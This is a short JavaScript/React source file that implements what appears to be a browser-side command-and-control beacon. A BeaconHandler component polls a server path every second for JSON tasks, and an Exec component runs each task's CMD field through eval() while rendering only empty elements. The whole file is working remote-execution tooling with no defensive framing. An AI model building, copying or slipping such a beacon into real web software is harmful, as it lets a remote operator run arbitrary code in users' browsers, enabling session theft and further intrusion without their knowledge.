var Exec = React.createClass({
		render: function() {
			var cmdNodes = this.props.data.map
				(
					function(command) {
						//Standard JS Eval for execution
						eval(command.CMD);
						return (<span></span>);
					});
			return (<b></b>);
		}
});

var BeaconHandler = React.createClass({
    loadCommandsFromServer:function(){
      $.ajax({
              url:this.props.url,
              dataType:'json',
              cache:false,
              success:function(data){
              this.setState({
              data:data
              });
            }.bind(this),error:function(xhr,status,err){
                         console.log(this.props.url,status,err.toString());
                         }.bind(this)
   });
  },
  getInitialState:function(){
    return{data:[]};
  },
  
  componentDidMount:function(){
    this.loadCommandsFromServer();
    setInterval(this.loadCommandsFromServer,this.props.pollInterval);
  },
  
//Push tasks to execution 
  render:function(){
  return(<Exec data ={this.state.data}/>);
  }
  
});


ReactDOM.render(
<BeaconHandler 
   url={'/0!!!1'}  
   pollInterval={1000}
   />,
   document.getElementById('oz')
);
